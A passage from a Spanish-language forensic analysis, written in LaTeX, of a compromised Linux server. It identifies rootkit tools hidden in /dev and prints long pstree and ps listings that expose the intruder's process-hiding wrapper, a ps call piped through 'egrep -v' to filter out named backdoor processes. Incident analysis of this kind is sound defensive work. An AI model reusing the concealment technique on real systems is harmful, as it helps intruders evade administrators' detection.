  <Socket>={-t|--tcp} {-u|--udp} {-w|--raw} {-x|--unix} --ax25 --ipx --netrom
Usage: x25_route [-v] del Target[/mask] [dev] If
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 Estas cadenas muestran que el programa es en realidad netstat. Netstat
muestra informaci'on sobre las conexiones activas al servidor y los
servicios que est'an abiertos. Troyanizar este programa es muy
importante para ocultar conexiones, siempre y cuando se sepa usar.

\verb+/dev/.tree+

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
.tree: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.0.30, dynamically 
linked (uses shared libs), stripped
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 Las cadenas de texto en \verb+.tree+ son:
 

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}

usage: pstree [ -a ] [ -c ] [ -h | -H pid ] [ -l ] [ -n ] [ -p ] [ -u ]
%14s[ -G | -U ] [ pid | user]
       pstree -V
    -a     show command line arguments
    -c     don't compact identical subtrees
    -h     highlight current process and its ancestors
    -H pid highlight process "pid" and its ancestors
    -G     use VT100 line drawing characters
    -l     don't truncate long lines
    -n     sort output by PID
    -p     show PIDs; implies -c
    -u     show uid transitions
    -U     use UTF-8 (Unicode) line drawing characters
    -V     display version information
    pid    start at pid, default 1 (init)
    user   show only trees rooted at processes of that user

\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

Las l'ineas anteriores muestran que el programa es \verb+pstree+. \verb+pstree+		
sirve para mostrar el 'arbol de procesos que se est'an ejecutando en una
m'aquina. El control de este programa es importante para hacer
invisibles los procesos que se elijan.

Todas estas herramientas sirven para conocer el estado del sistema y
las conexiones establecidas con el.  La presencia de estos programas en este
directorio es signo de que los programas que est'an en el sistema no
muestran cierta informaci'on que estos si dan, pues su funcionamiento
es el correcto.

Se corrieron algunos de estos programas con el sistema funcionando y
los resultados fueron los siguientes:

Usando \verb+/dev/.tree+

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
[1minit,1)[0m  
  |-(keventd,2)
  |-(i2oevtd,7)
  |-(kjournald,8)
  |-(khubd,57)
  |-(kjournald,112)
  |-portmap,152,daemon) 
  |-(rpciod,163)
  |-(lockd,164)
  |-syslogd,252) 
  |-klogd,265) 
  |-inetd,284) 
  |-lpd,299,daemon)   
  |-sshd,314) 
  |   |-sshd,6951) 
  |   |   `-sshd,6953,duende) 
  |   |       `-tcsh,6954) 
  |   `-sshd,18706) 
  |       `-bash,18708) 
  |           `-mc,29247) 
  |               `-bash,29250) -rcfile .bashrc 
  |                   `-last,6546) 
  |                       `-(last,6548)
  |-xfs,318) -daemon 
  |-atd,326,daemon) 
  |-cron,329) 
  |   |-cron,7772) 
  |   |   `-sh,7773,mail) -c ...
  |   |       `-exim,7774) -q 
  |   `-cron,11793) 
  |       `-sendmail,11809) -i -FCronDaemon -odi -oem root 
  |-gdm,334) 
  |   `-gdm,4739) 
  |       |-XFree86,4740) :0 -deferglyphs 16 -nolisten tcp vt7 -auth /var/lib/gdm/:0.Xauth 
  |       `-gdmlogin,5377,gdm) --disable-sound --disable-crash-dialog 
  |-getty,352) 38400 tty4 
  |-getty,353) 38400 tty5 
  |-getty,354) 38400 tty6 
  |-su,892) 
  |-su,4609,solanill) 
  |-bash,6746) 
  |   `-mc,7342) 
  |       |-cons.saver,7344) /dev/tty2 
  |       `-bash,7345) -rcfile .bashrc 
  |-[1mbash,6747)[0m 
  |   |-last,7031) 
  |   |   `-(last,7033)
  |   `-[1m.tree,7791)[0m -achlnpu 
  |-notifyme,6787) -C duende 
  |-bash,7483) 
  |   `-ps,7724) -u root 
  |       `-sh,7726) -c ...
  |           `-egrep,7728) -v egrep|dnsquery|-bash|linux|sysinit|db|identd|plogd|screen|ecko|
  			popclean|popclean|ps 
  |               `-(egrep,7729)
  |-exim,7787) -Mc 199GX3-00021V-00 
  |-tar,11017) chf - sbin 
  |   `-(tar,11019)
  |-sendmail,11820) -i -- brenton@victima1.com 
  |-egrep,12689,duende) -v egrep|dnsquery|-bash|linux|sysinit|db|identd|plogd|screen|ecko|
  			popclean|popclean|ps 
  |   `-(egrep,12690)
  |-egrep,14928,duende) -v egrep|dnsquery|-bash|linux|sysinit|db|identd|plogd|screen|ecko|
  			popclean|popclean|ps 
  |   `-(egrep,14929)
  |-echo,19340) a\c 
  |   `-(echo,19342)
  |-egrep,19341) c 
  |   `-(egrep,19343)
  `-egrep,26825) -l ^[0-5]\040 /dev/.libn 
      `-(egrep,26826)
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm


 Las l'ineas muestran cadenas de comandos que no aparecen usando el
pstree del sistema, una de ellas es la siguiente:


\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
-egrep,14928,duende) -v egrep|dnsquery|-bash|linux|sysinit|db|identd|plogd|screen|ecko|
			popclean|popclean|ps 
  |   `-(egrep,14929)
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 En esas l'ineas aparece una cadena donde se corren varios de los programas
estudiados, y nos indica claramente que fue ejecutado por el usuario duende.
 

 El \verb+/dev/.pst+
 
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
USER       PID %CPU %MEM   VSZ  RSS TTY      STAT START   TIME COMMAND
root         6  0.0  0.0     0    0 ?        SW   Apr23   0:04 [kupdated]
root         5  0.0  0.0     0    0 ?        SW   Apr23   0:00 [bdflush]
root         4  0.0  0.0     0    0 ?        SW   Apr23   0:06 [kswapd]
root         3  0.0  0.0     0    0 ?        SWN  Apr23   0:00 [ksoftirqd_CPU0]
root         1  0.0  0.1  1284  460 ?        S    Apr23   0:04 init [2]   TERM=linux BOOT_IMAGE=Linux
root         2  0.0  0.0     0    0 ?        SW   Apr23   0:07 [keventd]
root         7  0.0  0.0     0    0 ?        SW   Apr23   0:00 [i2oevtd]
root         8  0.0  0.0     0    0 ?        SW   Apr23   0:11 [kjournald]
root        57  0.0  0.0     0    0 ?        SW   Apr23   0:00 [khubd]
root       112  0.0  0.0     0    0 ?        SW   Apr23   0:08 [kjournald]
daemon     152  0.0  0.1  1384  432 ?        S    Apr23   0:00 /sbin/portmap PWD=/ CONSOLE=/dev/console
                 PREVLEVEL=N AUTOBOOT=YES runlevel=S prevlevel=N VERBOSE=yes SHLVL=2 BOOT_IMAGE=Linux 
                 TERM=linux PATH=/sbin:/bin:/usr/sbin:/usr/bin RUNLEVEL=S INIT_VERSION=sysvinit-2.84 _
                 =/sbin/start-stop-daemon
root       163  0.0  0.0     0    0 ?        SW   Apr23   0:03 [rpciod]
root       164  0.0  0.0     0    0 ?        SW   Apr23   0:00 [lockd]
root       252  0.0  0.3  2036  776 ?        S    Apr23   0:00 /sbin/syslogd PWD=/ CONSOLE=/dev/console 
                PREVLEVEL=N AUTOBOOT=YES runlevel=2 SHLVL=2 previous=N BOOT_IMAGE=Linux TERM=linux 
                PATH=/bin:/usr/bin:/sbin:/usr/sbin RUNLEVEL=2 INIT_VERSION=sysvinit-2.84 _
                =/sbin/start-stop-daemon
root       265  0.0  0.4  2120 1060 ?        S    Apr23   0:00 /sbin/klogd PWD=/ CONSOLE=/dev/console
                PREVLEVEL=N AUTOBOOT=YES runlevel=2 SHLVL=2 previous=N BOOT_IMAGE=Linux TERM=linux 
                PATH=/bin:/usr/bin:/sbin:/usr/sbin RUNLEVEL=2 INIT_VERSION=sysvinit-2.84 _
                =/sbin/start-stop-daemon
root       271  0.0  0.2  1444  540 ?        S    Apr23   0:00 /sbin/rpc.statd PWD=/ CONSOLE=
                /dev/console PREVLEVEL=N AUTOBOOT=YES runlevel=2 SHLVL=2 previous=N BOOT_IMAGE=Linux 
                TERM=linux PATH=/usr/local/sbin:/sbin:/bin:/usr/sbin:/usr/bin RUNLEVEL=2 INIT_VERSION
                =sysvinit-2.84 _=/sbin/start-stop-daemon OLDPWD=/
root       284  0.0  0.2  1992  652 ?        S    Apr23   0:00 /usr/sbin/inetd PWD=/ CONSOLE=/dev/console 
                PREVLEVEL=N AUTOBOOT=YES runlevel=2 SHLVL=2 previous=N BOOT_IMAGE=Linux TERM=linux 
                PATH=/usr/local/sbin:/sbin:/bin:/usr/sbin:/usr/bin RUNLEVEL=2 INIT_VERSION=sysvinit-2.84
		 _=/sbin/start-stop-daemon
daemon     299  0.0  0.2  1976  512 ?        S    Apr23   0:00 lpd Waiting                                                                                                                                                                                                                                                          
root       314  0.0  0.2  2788  660 ?        S    Apr23   0:00 /usr/sbin/sshd PWD=/ CONSOLE=/dev/console
                PREVLEVEL=N AUTOBOOT=YES runlevel=2 SHLVL=2 previous=N BOOT_IMAGE=Linux TERM=linux 
                PATH=/usr/local/sbin:/sbin:/bin:/usr/sbin:/usr/bin RUNLEVEL=2 INIT_VERSION=sysvinit-2.84
                _=/sbin/start-stop-daemon
root     18706  0.0  0.7  6552 1884 ?        S    13:39   0:03  \_ /usr/sbin/sshd PWD=/ 
                CONSOLE=/dev/console PREVLEVEL=N AUTOBOOT=YES runlevel=2 SHLVL=2 previous=N BOOT_IMAGE=
                Linux TERM=linux PATH=/usr/local/sbin:/sbin:/bin:/usr/sbin:/usr/bin RUNLEVEL=2 
                INIT_VERSION=sysvinit-2.84 _=/sbin/start-stop-daemon
root     18708  0.0  0.5  2268 1316 pts/4    S    13:39   0:00  |   \_ -bash USER=root LOGNAME=root 
                HOME=/root PATH=/bin:/usr/bin:/usr/local/bin:/usr/X11R6/bin MAIL=/var/mail/root 
                SHELL=/bin/bash SSH_CLIENT=xxx.xxx.xxx.89 32817 22 SSH_TTY=/dev/pts/4 TERM=linux LANG=C
root     29247  0.0  0.7  2952 1780 pts/4    S    16:22   0:01  |       \_ mc PWD=/root PS1=\h:\w\$  
                USER=root MAIL=/var/mail/root LANG=C SSH_CLIENT=xxx.xxx.xxx.89 32817 22 LOGNAME=root 
                SHLVL=1 SHELL=/bin/bash HOME=/root TERM=linux PATH=/usr/local/sbin:/usr/local/bin:
                /usr/sbin:/usr/bin:/sbin:/bin:/usr/bin/X11 SSH_TTY=/dev/pts/4 _=/usr/bin/mc 
                OLDPWD=/root/chkrootkit-0.40
root     29250  0.0  0.5  2236 1288 pts/5    S    16:22   0:00  |           \_ bash -rcfile .bashrc 
                PWD=/root PS1=\h:\w\$  USER=root MAIL=/var/mail/root LANG=C SSH_CLIENT=xxx.xxx.xxx.89 
                32817 22 LOGNAME=root SHLVL=1 SHELL=/bin/bash HOME=/root TERM=linux PATH=/usr/local/sbin:
                /usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/bin/X11 SSH_TTY=/dev/pts/4 _
                =/usr/bin/mc OLDPWD=/root/chkrootkit-0.40 MC_CONTROL_FILE=/tmp/mc.29247.control 
                HISTCONTROL=ignorespace
root      6546  0.0  0.0  1260  248 pts/5    T    17:54   0:00  |               \_ last PWD=/dev PS1=\h:
                \w\$  USER=root HISTCONTROL=ignorespace MAIL=/var/mail/root LANG=C SSH_CLIENT=
                xxx.xxx.xxx.89 32817 22 LOGNAME=root SHLVL=2 SHELL=/bin/bash MC_CONTROL_FILE=
                /tmp/mc.29247.control HOME=/root TERM=linux PATH=/usr/local/sbin:/usr/local/bin:
                /usr/sbin:/usr/bin:/sbin:/bin:/usr/bin/X11 SSH_TTY=/dev/pts/4 OLDPWD=/ _=/usr/bin/last
root      6548  0.0  0.0     0    0 pts/5    Z    17:54   0:00  |                   \_ [last <defunct>]
root      6951  0.0  0.6  6400 1712 ?        S    20:09   0:00  \_ /usr/sbin/sshd PWD=/ 
                CONSOLE=/dev/console PREVLEVEL=N AUTOBOOT=YES runlevel=2 SHLVL=2 previous=N 
                BOOT_IMAGE=Linux TERM=linux PATH=/usr/local/sbin:/sbin:/bin:/usr/sbin:/usr/bin RUNLEVEL=2
                INIT_VERSION=sysvinit-2.84 _=/sbin/start-stop-daemon
duende   6953  0.0  0.7  6408 1820 ?        S    20:09   0:00      \_ /usr/sbin/sshd PWD=/ 
                CONSOLE=/dev/console PREVLEVEL=N AUTOBOOT=YES runlevel=2 SHLVL=2 previous=N 
                BOOT_IMAGE=Linux TERM=linux PATH=/usr/local/sbin:/sbin:/bin:/usr/sbin:/usr/bin RUNLEVEL=2 
                INIT_VERSION=sysvinit-2.84 _=/sbin/start-stop-daemon
duende   6954  0.0  0.6  2780 1528 pts/6    S    20:09   0:00          \_ -tcsh USER=duende 
                LOGNAME=duende HOME=/home/staff/duende PATH=/bin:/usr/bin:/usr/local/bin:/usr/X11R6/bin 
                MAIL=/var/mail/duende SHELL=/bin/tcsh SSH_CLIENT=xxx.xxx.xxx.2 34189 22 
                SSH_TTY=/dev/pts/6 TERM=xterm LANG=C
root       318  0.0  0.1  4240  456 ?        S    Apr23   0:00 /usr/bin/X11/xfs -daemon PWD=/ 
                CONSOLE=/dev/console PREVLEVEL=N AUTOBOOT=YES runlevel=2 SHLVL=2 previous=N BOOT_IMAGE=
                Linux TERM=linux PATH=/bin:/usr/bin:/sbin:/usr/sbin RUNLEVEL=2 INIT_VERSION=sysvinit-2.84
                =/sbin/start-stop-daemon
root       321  0.1  0.5  2940 1476 ?        S    Apr23   4:47 /usr/sbin/rpc.nfsd PWD=/ CONSOLE=
                /dev/console PREVLEVEL=N AUTOBOOT=YES runlevel=2 SHLVL=2 previous=N BOOT_IMAGE=Linux 
                TERM=linux PATH=/usr/local/sbin:/sbin:/bin:/usr/sbin:/usr/bin RUNLEVEL=2 INIT_VERSION=
                sysvinit-2.84 _=/sbin/start-stop-daemon
root       323  0.0  0.3  2476  952 ?        S    Apr23   0:00 /usr/sbin/rpc.mountd PWD=/ CONSOLE=
                /dev/console PREVLEVEL=N AUTOBOOT=YES runlevel=2 SHLVL=2 previous=N BOOT_IMAGE=Linux 
                TERM=linux PATH=/usr/local/sbin:/sbin:/bin:/usr/sbin:/usr/bin RUNLEVEL=2 INIT_VERSION=
                sysvinit-2.84 _=/sbin/start-stop-daemon
daemon     326  0.0  0.2  1384  516 ?        S    Apr23   0:00 /usr/sbin/atd PWD=/ CONSOLE=/dev/console 
                PREVLEVEL=N AUTOBOOT=YES runlevel=2 SHLVL=2 previous=N BOOT_IMAGE=Linux TERM=linux 
                PATH=/bin:/usr/bin:/sbin:/usr/sbin RUNLEVEL=2 INIT_VERSION=sysvinit-2.84 _
                =/sbin/start-stop-daemon
root       329  0.0  0.2  1652  616 ?        S    Apr23   0:00 /usr/sbin/cron PWD=/ CONSOLE=/dev/console 
                PREVLEVEL=N AUTOBOOT=YES runlevel=2 SHLVL=2 previous=N BOOT_IMAGE=Linux TERM=linux 
                PATH=/usr/local/sbin:/sbin:/bin:/usr/sbin:/usr/bin RUNLEVEL=2 INIT_VERSION=sysvinit-2.84
                _=/sbin/start-stop-daemon
root     11793  0.0  0.3  1760  764 ?        S    06:25   0:00  \_ /USR/SBIN/CRON PWD=/ 
                CONSOLE=/dev/console PREVLEVEL=N AUTOBOOT=YES runlevel=2 SHLVL=2 previous=N BOOT_IMAGE=
                Linux TERM=linux PATH=/usr/local/sbin:/sbin:/bin:/usr/sbin:/usr/bin RUNLEVEL=2 
                INIT_VERSION=sysvinit-2.84 _=/sbin/start-stop-daemon
root     11809  0.0  0.1  2612  488 ?        T    06:25   0:00      \_ /usr/sbin/sendmail -i -FCronDaemon
                -odi -oem root PWD=/ CONSOLE=/dev/console PREVLEVEL=N AUTOBOOT=YES runlevel=2 SHLVL=2 
                previous=N BOOT_IMAGE=Linux TERM=linux PATH=/usr/bin:/bin RUNLEVEL=2 INIT_VERSION=
                sysvinit-2.84 _=/sbin/start-stop-daemon
root       334  0.0  0.6  7292 1624 ?        S    Apr23   0:00 /usr/bin/gdm PWD=/ CONSOLE=/dev/console 
                PREVLEVEL=N AUTOBOOT=YES runlevel=2 SHLVL=2 previous=N BOOT_IMAGE=Linux TERM=linux 
                PATH=/sbin:/bin:/usr/sbin:/usr/bin RUNLEVEL=2 INIT_VERSION=sysvinit-2.84 _=
                /sbin/start-stop-daemon
root      4739  0.0  0.8  7340 2100 ?        S    Apr24   0:00  \_ /usr/bin/gdm PWD=/ CONSOLE=
                /dev/console PREVLEVEL=N AUTOBOOT=YES runlevel=2 SHLVL=2 previous=N BOOT_IMAGE=Linux 
                TERM=linux PATH=/sbin:/bin:/usr/sbin:/usr/bin RUNLEVEL=2 INIT_VERSION=sysvinit-2.84 _=
                /sbin/start-stop-daemon
root      4740  0.0  2.0 72896 5188 ?        S<   Apr24   0:52      \_ /usr/bin/X11/X :0 -deferglyphs 16 
                -nolisten tcp vt7 -auth /var/lib/gdm/:0.Xauth PWD=/ CONSOLE=/dev/console PREVLEVEL=N 
                AUTOBOOT=YES runlevel=2 SHLVL=2 previous=N BOOT_IMAGE=Linux TERM=linux PATH=/sbin:/bin:
                /usr/sbin:/usr/bin RUNLEVEL=2 INIT_VERSION=sysvinit-2.84 _=/sbin/start-stop-daemon 
                XAUTHORITY=/var/lib/gdm/:0.Xauth DISPLAY=:0
gdm       5377  0.0  1.4  7928 3724 ?        S    Apr24   0:00      \_ /usr/bin/gdmlogin --disable-sound 
                --disable-crash-dialog XAUTHORITY=/var/lib/gdm/:0.Xauth DISPLAY=:0 LOGNAME=gdm USER=gdm 
                USERNAME=gdm GDM_GREETER_PROTOCOL_VERSION=1 GDM_VERSION=2.2.5.5 HOME=/var/lib/gdm SHELL=
                /bin/false PATH=/usr/local/bin:/usr/bin:/bin:/usr/bin/X11:/usr/games RUNNING_UNDER_GDM=
                true GDM_IS_LOCAL=yes GDM_TIMED_LOGIN_OK= 
root       352  0.0  0.1  1256  412 tty4     S    Apr23   0:00 /sbin/getty 38400 tty4  BOOT_IMAGE=Linux 
                AUTOBOOT=YES PATH=/usr/local/sbin:/sbin:/bin:/usr/sbin:/usr/bin RUNLEVEL=2 PREVLEVEL=N 
                CONSOLE=/dev/console INIT_VERSION=sysvinit-2.84
root       353  0.0  0.1  1256  400 tty5     S    Apr23   0:00 /sbin/getty 38400 tty5  BOOT_IMAGE=Linux 
                AUTOBOOT=YES PATH=/usr/local/sbin:/sbin:/bin:/usr/sbin:/usr/bin RUNLEVEL=2 PREVLEVEL=N 
                CONSOLE=/dev/console INIT_VERSION=sysvinit-2.84
root       354  0.0  0.1  1256  400 tty6     S    Apr23   0:00 /sbin/getty 38400 tty6  BOOT_IMAGE=Linux 
                AUTOBOOT=YES PATH=/usr/local/sbin:/sbin:/bin:/usr/sbin:/usr/bin RUNLEVEL=2 PREVLEVEL=N 
                CONSOLE=/dev/console INIT_VERSION=sysvinit-2.84
root       892  0.0  0.0  1524  224 ?        S    Apr23   0:00 su PWD=/home/misc/brenton PS1=\u@\h:\w\$  
                USER=brenton MAIL=/var/mail/brenton LANG=C SSH_CLIENT=xxx.xxx.xxx.89 45170 22 LOGNAME=brenton 
                SHLVL=1 SHELL=/bin/bash HOME=/home/misc/brenton TERM=linux PATH=/usr/local/bin:/usr/bin:
                /bin:/usr/bin/X11:/usr/games SSH_TTY=/dev/pts/0 _=/bin/su
solanill  4609  0.0  0.3  2056  948 ?        S    Apr24   0:01 ./su 
                REMOTEHOST=dup-200-64-59-216.prodigy.net.mx TERM=vt52 HZ=100 HOME=/home/staff/solanill 
                SHELL=/bin/tcsh PATH=/usr/local/bin:/usr/bin:/bin:/usr/bin/X11:/usr/games USER=solanill 
                LOGNAME=solanill MAIL=/var/mail/solanill LANG=C HUSHLOGIN=FALSE HOSTTYPE=i386-linux 
                VENDOR=intel OSTYPE=linux MACHTYPE=i386 SHLVL=1 PWD=/home/staff/solanill/... GROUP=unknown 
                HOST=victima1
root     11017  0.0  0.1  1516  372 ?        T    Apr24   0:00 tar chf - sbin PWD=/ USER=root 
                HISTCONTROL=ignorespace MAIL=/var/mail/root OLDPWD=/sbin LANG=C SSH_CLIENT=xxx.xxx.xxx.89 
                32949 22 LOGNAME=root SHLVL=3 SHELL=/bin/bash MC_CONTROL_FILE=/tmp/mc.10988.control 
                HOME=/root TERM=linux PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:
                /usr/bin/X11 SSH_TTY=/dev/pts/4 _=/bin/tar
root     11019  0.0  0.0     0    0 ?        Z    Apr24   0:00  \_ [tar <defunct>]
root     11820  0.0  0.1  2612  488 ?        T    06:25   0:00 send-mail -i -- 
                brenton@victima1.com PWD=/usr/lib OLDPWD=/root LOGNAME=root SHLVL=2 SHELL=/bin/sh 
                HOME=/root PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin _
                =/usr/bin/mail
duende  12689  0.0  0.0  1284  252 ?        T    07:43   0:00 /bin/egrep -v egrep|dnsquery|-bash|linux
                |sysinit|db|identd|plogd|screen|ecko|popclean|popclean|ps PWD=/dev/zqft4 VENDOR=intel 
                REMOTEHOST=victima2.foo.bar.mx MOZILLA_HOME=/usr/local/netscape OPENWINHOME=/usr/openwin 
                USER=duende MACHTYPE=i386 MAIL=/var/mail/duende LANG=C HOST=victima1 
                SSH_CLIENT=xxx.xxx.xxx.2 33996 22 LOGNAME=duende SHLVL=2 GROUP=unknown SHELL=/bin/tcsh 
                HOSTTYPE=i386-linux OSTYPE=linux HOME=/home/staff/duende TERM=vt100 PATH=/bin:/usr/bin:
                /usr/local/bin:/usr/X11R6/bin:.:/home/staff/duende/prog/bin:/usr/local/bin:/opt/kde/bin:
                /home/staff/duende/bin SSH_TTY=/dev/pts/3 _=/bin/egrep
duende  12690  0.0  0.0     0    0 ?        Z    07:43   0:00  \_ [egrep <defunct>]
duende  14928  0.0  0.0  1284  252 ?        T    10:04   0:00 /bin/egrep -v egrep|dnsquery|-bash|linux
                |sysinit|db|identd|plogd|screen|ecko|popclean|popclean|ps PWD=/home/staff/duende 
                VENDOR=intel REMOTEHOST=victima2.foo.bar.mx MOZILLA_HOME=/usr/local/netscape 
                OPENWINHOME=/usr/openwin USER=duende MACHTYPE=i386 MAIL=/var/mail/duende LANG=C 
                HOST=victima1 SSH_CLIENT=xxx.xxx.xxx.2 34041 22 LOGNAME=duende SHLVL=2 GROUP=unknown 
                SHELL=/bin/tcsh HOSTTYPE=i386-linux OSTYPE=linux HOME=/home/staff/duende TERM=vt100 
                PATH=/bin:/usr/bin:/usr/local/bin:/usr/X11R6/bin:.:/home/staff/duende/prog/bin:
                /usr/local/bin:/opt/kde/bin:/home/staff/duende/bin SSH_TTY=/dev/pts/9 _=/bin/egrep
duende  14929  0.0  0.0     0    0 ?        Z    10:04   0:00  \_ [egrep <defunct>]
root     19340  0.0  0.0  1244  244 pts/4    T    14:18   0:00 /bin/echo a\c PWD=/root/chkrootkit-0.40 
                USER=root MAIL=/var/mail/root LANG=C SSH_CLIENT=xxx.xxx.xxx.89 32817 22 LOGNAME=root 
                SHLVL=2 SHELL=/bin/bash HOME=/root TERM=linux PATH=/usr/local/sbin:/usr/local/bin:
                /usr/sbin:/usr/bin:/sbin:/bin:/usr/bin/X11 SSH_TTY=/dev/pts/4 _=/bin/echo
root     19342  0.0  0.0     0    0 pts/4    Z    14:18   0:00  \_ [echo <defunct>]
root     19341  0.0  0.0  1280  248 pts/4    T    14:18   0:00 /bin/egrep c PWD=/root/chkrootkit-0.40 
                USER=root MAIL=/var/mail/root LANG=C SSH_CLIENT=xxx.xxx.xxx.89 32817 22 LOGNAME=root 
                SHLVL=2 SHELL=/bin/bash HOME=/root TERM=linux PATH=/usr/local/sbin:/usr/local/bin:
                /usr/sbin:/usr/bin:/sbin:/bin:/usr/bin/X11 SSH_TTY=/dev/pts/4 _=/bin/egrep
root     19343  0.0  0.0     0    0 pts/4    Z    14:18   0:00  \_ [egrep <defunct>]
root     26825  0.0  0.0  1280  248 pts/4    T    14:25   0:00 /bin/egrep -l ^[0-5]  /dev/.libn 
                PWD=/root/chkrootkit-0.40 USER=root MAIL=/var/mail/root LANG=C SSH_CLIENT=xxx.xxx.xxx.89 
                32817 22 LOGNAME=root SHLVL=2 SHELL=/usr/bin/esh HOME=/root TERM=linux 
                PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/bin/X11 
                SSH_TTY=/dev/pts/4 _=/usr/bin/find
root     26826  0.0  0.0     0    0 pts/4    Z    14:25   0:00  \_ [egrep <defunct>]
root      6746  0.0  0.4  2228 1248 tty2     S    18:21   0:00 -bash TERM=linux HZ=100 HOME=/root 
                SHELL=/bin/bash PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/bin/X11:/usr/local/sbin:
                /usr/local/bin USER=root LOGNAME=root MAIL=/var/mail/root LANG=C HUSHLOGIN=FALSE
root      7342  0.7  0.6  2828 1664 tty2     D    20:52   0:20  \_ mc PWD=/root HZ=100 PS1=\h:\w\$  
                USER=root MAIL=/var/mail/root LANG=C LOGNAME=root SHLVL=1 HUSHLOGIN=FALSE SHELL=/bin/bash 
                TERM=linux HOME=/root PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:
                /usr/bin/X11 _=/usr/bin/mc OLDPWD=/home/staff/duende
root      7344  0.0  0.1  1240  324 ?        S    20:52   0:00      \_ cons.saver /dev/tty2 PWD=/root 
                HZ=100 PS1=\h:\w\$  USER=root MAIL=/var/mail/root LANG=C LOGNAME=root SHLVL=1 
                HUSHLOGIN=FALSE SHELL=/bin/bash TERM=linux HOME=/root PATH=/usr/local/sbin:
                /usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/bin/X11 _=/usr/bin/mc 
                OLDPWD=/home/staff/duende MC_CONTROL_FILE=/tmp/mc.7342.control
root      7345  0.0  0.4  2224 1244 pts/8    S    20:52   0:00      \_ bash -rcfile .bashrc PWD=/root 
                HZ=100 PS1=\h:\w\$  USER=root MAIL=/var/mail/root LANG=C LOGNAME=root SHLVL=1 
                HUSHLOGIN=FALSE SHELL=/bin/bash TERM=linux HOME=/root PATH=/usr/local/sbin:
                /usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/bin/X11 _=/usr/bin/mc OLDPWD=
                /home/staff/duende MC_CONTROL_FILE=/tmp/mc.7342.control HISTCONTROL=ignorespace
root      6747  0.0  0.4  2228 1260 tty1     S    18:21   0:00 -bash TERM=linux HZ=100 HOME=/root SHELL=
                /bin/bash PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/bin/X11:/usr/local/sbin:/usr/local/bin 
                USER=root LOGNAME=root MAIL=/var/mail/root LANG=C HUSHLOGIN=FALSE
root      7031  0.0  0.0  1260  248 tty1     T    20:16   0:00  \_ last PWD=/root HZ=100 PS1=\h:\w\$  
                USER=root MAIL=/var/mail/root LANG=C LOGNAME=root SHLVL=1 HUSHLOGIN=FALSE SHELL=/bin/bash 
                TERM=linux HOME=/root PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:
                /usr/bin/X11 _=/usr/bin/last
root      7033  0.0  0.0     0    0 tty1     Z    20:16   0:00  |   \_ [last <defunct>]
root      7756  0.0  0.6  3552 1564 tty1     R    21:34   0:00  \_ /dev/.pst eaxfu PWD=/root HZ=100 
                PS1=\h:\w\$  USER=root MAIL=/var/mail/root LANG=C LOGNAME=root SHLVL=1 HUSHLOGIN=FALSE 
                SHELL=/bin/bash TERM=linux HOME=/root PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:
                /usr/bin:/sbin:/bin:/usr/bin/X11 _=/dev/.pst
root      6787  0.0  0.1  1260  440 pts/5    S    18:24   0:00 notifyme -C duende PWD=/root PS1=\h:\w\$  
                USER=root HISTCONTROL=ignorespace MAIL=/var/mail/root LANG=C SSH_CLIENT=xxx.xxx.xxx.89 
                32817 22 LOGNAME=root SHLVL=2 SHELL=/bin/bash MC_CONTROL_FILE=/tmp/mc.29247.control 
                HOME=/root TERM=linux PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:
                /usr/bin/X11 SSH_TTY=/dev/pts/4 OLDPWD=/dev _=/usr/bin/notifyme
root      7483  0.0  0.4  2224 1232 tty3     S    21:07   0:00 -bash TERM=linux HZ=100 HOME=/root 
                SHELL=/bin/bash PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/bin/X11:/usr/local/sbin:
                /usr/local/bin USER=root LOGNAME=root MAIL=/var/mail/root LANG=C HUSHLOGIN=FALSE
root      7724  0.0  0.1  1284  388 tty3     T    21:32   0:00  \_ ps -u root PWD=/root HZ=100 
                PS1=\h:\w\$  USER=root MAIL=/var/mail/root LANG=C LOGNAME=root SHLVL=1 HUSHLOGIN=FALSE 
                SHELL=/bin/bash TERM=linux HOME=/root PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:
                /usr/bin:/sbin:/bin:/usr/bin/X11 _=/bin/ps
root      7726  0.0  0.3  2024  888 tty3     T    21:32   0:00      \_ sh -c /dev/.pst  -u root | 
                /bin/egrep -v "egrep|dnsquery|-bash|linux|sysinit|db|identd|plogd|screen|ecko|popclean
                |popclean|ps" PWD=/root HZ=100 PS1=\h:\w\$  USER=root MAIL=/var/mail/root LANG=C 
                LOGNAME=root SHLVL=1 HUSHLOGIN=FALSE SHELL=/bin/bash TERM=linux HOME=/root 
                PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/bin/X11 _=/bin/ps
